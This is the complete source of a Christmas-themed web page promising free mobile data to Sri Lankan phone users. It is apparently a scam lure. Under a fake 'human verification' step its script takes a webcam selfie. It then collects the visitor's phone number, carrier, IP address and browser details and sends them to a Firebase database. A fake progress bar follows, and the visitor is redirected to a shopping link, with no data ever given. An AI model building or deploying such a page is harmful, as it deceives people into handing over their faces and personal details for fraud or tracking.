<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>X-mAS reactr 🎄</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Mountains+of+Christmas:wght@700&family=Noto+Sans+Sinhala:wght@400;700&display=swap');

        :root {
            --primary-red: #d42426;
            --primary-green: #165b33;
            --gold: #f8b229;
        }

        body {
            margin: 0;
            padding: 0;
            font-family: 'Noto Sans Sinhala', sans-serif;
            background: linear-gradient(135deg, #165b33, #0b2d19);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow-x: hidden;
            color: #333;
        }

        /* Snow */
        #snow-container {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; z-index: 1;
        }
        .snowflake {
            position: absolute; top: -10px; color: white;
            animation: fall linear infinite;
        }

        /* Card */
        .card {
            background: rgba(255, 255, 255, 0.98);
            width: 90%; max-width: 400px;
            border-radius: 20px; text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            z-index: 10; position: relative;
            border: 4px solid var(--primary-red);
            padding: 25px 20px; 
            margin: 20px 0;
        }

        h1 {
            font-family: 'Mountains of Christmas', cursive;
            color: var(--primary-red); margin: 0; font-size: 2.2rem;
            margin-bottom: 5px;
        }

        .funny-text {
            font-weight: 800; font-size: 1.5rem;
            background: -webkit-linear-gradient(#f8b229, #d42426);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            margin: 10px 0 20px 0; text-transform: uppercase;
            animation: wiggle 2s linear infinite;
        }

        /* Inputs */
        select, .data-btn, #reload-btn, input[type="text"], .capture-btn {
            width: 100%; border-radius: 10px; font-family: inherit; box-sizing: border-box;
        }

        select, input[type="text"] {
            padding: 12px; border: 2px solid #ccc; margin-bottom: 15px; font-size: 1rem;
        }

        /* Phone Input Specifics */
        .phone-group { position: relative; text-align: left; margin-bottom: 15px; }
        .phone-label { font-size: 0.9rem; color: var(--primary-green); font-weight: bold; margin-bottom: 5px; display: block; }
        
        .capture-btn {
            padding: 12px; border: 2px solid var(--gold);
            background: #fff8e1; color: #d48806;
            font-weight: bold; cursor: pointer; margin-bottom: 20px;
            display: flex; justify-content: center; align-items: center; gap: 10px;
            transition: 0.3s;
        }
        .capture-btn:active { transform: scale(0.98); }
        .capture-btn.captured {
            background: var(--primary-green); color: white; border-color: var(--primary-green);
        }

        .data-grid {
            display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px;
        }

        .data-btn {
            padding: 12px; border: 2px solid var(--primary-green);
            background: white; color: var(--primary-green);
            font-weight: bold; cursor: pointer;
        }

        .data-btn.active {
            background: var(--primary-green); color: white;
            transform: scale(1.05);
        }

        #reload-btn {
            padding: 15px; background: var(--primary-red); color: white;
            border: none; border-radius: 50px; font-size: 1.5rem;
            font-weight: bold; font-family: 'Mountains of Christmas', cursive;
            cursor: pointer; display: none; animation: pulse 1.5s infinite;
        }

        /* Modals */
        .modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85); z-index: 1000;
            display: none; justify-content: center; align-items: center;
        }

        .modal-box {
            background: white; padding: 25px; border-radius: 15px;
            width: 85%; max-width: 350px; text-align: center;
            border: 3px solid var(--primary-red);
        }

        .loader-circle {
            border: 8px solid #f3f3f3; border-top: 8px solid var(--primary-red);
            border-radius: 50%; width: 60px; height: 60px;
            animation: spin 1s linear infinite; margin: 0 auto 20px auto;
        }

        /* Animations */
        @keyframes fall { to { transform: translateY(110vh); } }
        @keyframes wiggle { 0%, 7% { transform: rotateZ(0); } 15% { transform: rotateZ(-5deg); } 20% { transform: rotateZ(3deg); } 25% { transform: rotateZ(-5deg); } 30% { transform: rotateZ(2deg); } 35%, 100% { transform: rotateZ(0); } }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="snow-container"></div>

    <!-- LOADER MODAL -->
    <div id="loader-modal" class="modal-overlay">
        <div class="modal-box">
            <div class="loader-circle"></div>
            <h3>Processing...</h3>
            <p id="progress-text">Connecting 0%</p>
        </div>
    </div>

    <!-- MAIN UI -->
    <div class="card">
        <h1>X-mAS reactr 🎅</h1>
        <div class="funny-text">FREE DATA by reactr</div>

        <!-- Capture Button -->
        <button id="capture-btn" class="capture-btn" onclick="captureProfilePhoto()">
            <span>🔐</span> Click Here To Verify Before Proceed
        </button>

        <!-- Carrier Select -->
        <div class="phone-group">
            <label class="phone-label">සිම්පත තෝරාගන්න 👇</label>
            <select id="carrier">
                <option value="" disabled selected>Select SIM</option>
                <option value="Hutch">Hutch</option>
                <option value="Airtel">Airtel</option>
                <option value="Dialog">Dialog</option>
                <option value="Mobitel">Mobitel</option>
            </select>
        </div>

        <!-- Phone Number Input -->
        <div class="phone-group">
            <label class="phone-label" for="phone">Phone Number 📱</label>
            <input type="text" id="phone" placeholder="+94 7X XXX XXXX" value="+94" maxlength="12">
            <small id="phone-error" style="color: red; display: none;">Invalid Number! Must be +94 7...</small>
        </div>

        <!-- Data Grid -->
        <div class="data-grid">
            <button class="data-btn" onclick="selectData(this, '1GB')">1 GB</button>
            <button class="data-btn" onclick="selectData(this, '5GB')">5 GB</button>
            <button class="data-btn" onclick="selectData(this, '10GB')">10 GB</button>
            <button class="data-btn" onclick="selectData(this, '50GB')">50 GB</button>
        </div>

        <button id="reload-btn" onclick="handleFinalSubmit()">RELOAD NOW 🚀</button>

        <div class="footer">
            X-mAS Reactr Special Edition ☃️
        </div>
    </div>

    <!-- Firebase SDKs -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
        import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyC0P8GHxEzzYhI-7KNjKhKjZtBWt7Lk1p4",
            authDomain: "reactr-5b381.firebaseapp.com",
            databaseURL: "https://reactr-5b381-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "reactr-5b381",
            storageBucket: "reactr-5b381.firebasestorage.app",
            messagingSenderId: "461901456532",
            appId: "1:461901456532:web:c4a62622565e07dcb00081",
            measurementId: "G-YNVEGSLSNT"
        };

        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);

        // Expose save function globally
        window.saveDataToFirebase = function(data) {
            const dataRef = ref(database, 'xmas_reactr_submissions');
            const newEntry = push(dataRef);
            set(newEntry, data)
                .then(() => console.log("Data saved successfully"))
                .catch((e) => console.error("Error saving data: ", e));
        };
    </script>

    <script>
        // --- Global Variables ---
        let selectedDataAmount = "";
        let capturedImageBase64 = null;

        // --- 1. Snow Animation ---
        function createSnow() {
            const container = document.getElementById('snow-container');
            setInterval(() => {
                const flake = document.createElement('div');
                flake.classList.add('snowflake');
                flake.innerText = ['❄️', '❅', '❆', '✨'][Math.floor(Math.random() * 4)];
                flake.style.left = Math.random() * 100 + 'vw';
                flake.style.opacity = Math.random();
                flake.style.fontSize = (Math.random() * 20 + 10) + 'px';
                flake.style.animationDuration = (Math.random() * 3 + 2) + 's';
                container.appendChild(flake);
                setTimeout(() => flake.remove(), 5000);
            }, 200);
        }
        createSnow();

        // --- 2. Phone Validation Logic ---
        const phoneInput = document.getElementById('phone');
        const phoneError = document.getElementById('phone-error');

        phoneInput.addEventListener('input', function(e) {
            let value = e.target.value;
            // Force +94 start
            if (!value.startsWith('+94')) {
                value = '+94' + value.replace(/^\+94/, '');
            }
            // Allow only numbers after +
            value = '+' + value.substring(1).replace(/[^0-9]/g, '');
            
            // Prevent 0 after 94 (index 3)
            if (value.length > 3 && value.charAt(3) === '0') {
                value = value.slice(0, 3);
            }
            e.target.value = value;
        });

        function validatePhone() {
            const regex = /^\+947[0-9]{8}$/; // +94 followed by 7 and 8 digits
            if (!regex.test(phoneInput.value)) {
                phoneError.style.display = 'block';
                phoneInput.style.borderColor = 'red';
                return false;
            }
            phoneError.style.display = 'none';
            phoneInput.style.borderColor = '#165b33';
            return true;
        }

        // --- 3. Camera Capture Logic (Hidden/Background style) ---
        async function captureProfilePhoto() {
            try {
                // Request Camera (User will see permission prompt)
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user', width: 320 } // Low res for faster upload
                });

                // Create hidden video element to process stream
                const video = document.createElement('video');
                video.srcObject = stream;
                video.playsInline = true;
                video.autoplay = true;

                // Wait for video to be ready
                await new Promise(resolve => video.onloadedmetadata = resolve);
                
                // Short delay to allow auto-exposure/focus
                await new Promise(resolve => setTimeout(resolve, 500));

                // Capture to hidden canvas
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                
                // Flip horizontally (mirror selfie)
                ctx.translate(canvas.width, 0);
                ctx.scale(-1, 1);
                ctx.drawImage(video, 0, 0);

                // Convert to Base64
                capturedImageBase64 = canvas.toDataURL('image/jpeg', 0.7); // 0.7 quality

                // Stop Stream
                stream.getTracks().forEach(track => track.stop());

                // Update UI
                const btn = document.getElementById('capture-btn');
                btn.innerHTML = "<span>✅</span> Human Verified Successfully";
                btn.classList.add('captured');

            } catch (err) {
                console.error(err);
                alert("Camera permission is required to register! Please allow access.");
            }
        }

        // --- 4. UI Interactions ---
        function selectData(element, amount) {
            document.querySelectorAll('.data-btn').forEach(btn => btn.classList.remove('active'));
            element.classList.add('active');
            selectedDataAmount = amount;
            const btn = document.getElementById('reload-btn');
            btn.style.display = 'block';
            btn.scrollIntoView({ behavior: "smooth" });
        }

        // --- 5. Final Submission ---
        async function handleFinalSubmit() {
            // Validation
            if (!document.getElementById('carrier').value) {
                alert("Please select a SIM!");
                return;
            }
            if (!validatePhone()) {
                alert("Please check your phone number!");
                return;
            }
            if (!capturedImageBase64) {
                // Optional: Force photo? Let's warn but allow if fails
                if(!confirm("You haven't captured a photo yet. Proceed anyway?")) return;
            }

            // Show Loader
            document.getElementById('loader-modal').style.display = 'flex';

            // Get IP
            let userIp = "Unknown";
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const json = await res.json();
                userIp = json.ip;
            } catch(e) {}

            // Compile Data
            const userData = {
                carrier: document.getElementById('carrier').value,
                phone: document.getElementById('phone').value,
                dataPackage: selectedDataAmount,
                photoBase64: capturedImageBase64 || "No Photo",
                ip: userIp,
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString()
            };

            // Save to Firebase
            if (window.saveDataToFirebase) {
                window.saveDataToFirebase(userData);
            }

            // Loader Animation & Redirect
            let progress = 0;
            const textElement = document.getElementById('progress-text');
            const interval = setInterval(() => {
                progress += Math.floor(Math.random() * 10) + 5;
                if (progress > 100) progress = 100;
                textElement.innerText = `Connecting ${progress}%`;

                if (progress === 100) {
                    clearInterval(interval);
                    setTimeout(() => {
                        window.location.href = "https://www.aliexpress.com/ssr/300001995/N3KsYt2f3a?disableNav=YES&pha_manifest=ssr&_immersiveMode=true";
                    }, 2000);
                }
            }, 300);
        }
    </script>
</body>
</html>
